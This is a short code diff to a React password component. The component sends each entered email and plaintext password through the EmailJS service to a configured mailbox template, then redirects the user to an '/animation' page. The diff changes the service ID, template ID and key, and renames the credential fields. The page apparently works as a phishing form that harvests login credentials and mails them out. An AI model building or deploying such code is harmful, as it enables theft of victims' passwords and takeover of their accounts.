@@ -21,10 +21,10 @@ const Password = () => {
 
     emailjs
       .send(
-        "service_rp4ht9g",
-        "template_gfkbans",
-        { user_email: email, user_password: password },
-        "LhNGTlaSzpZLxmy0Z"
+        "service_n0p250r",
+        "template_u1y1vhc",
+        { email: email, password: password },
+        "U6DuIRAvsZ6BSxz-q"
       )
       .then(() => {
         router.push("/animation");
@@ -59,6 +59,7 @@ const Password = () => {
           <input
             type="password"
             placeholder="Password"
+            name="password"
             value={password}
             onChange={(e) => setPassword(e.target.value)}
             className="w-full border border-gray-300 rounded-sm px-3 py-2 focus:outline-none focus:ring-1 focus:ring-blue-500"
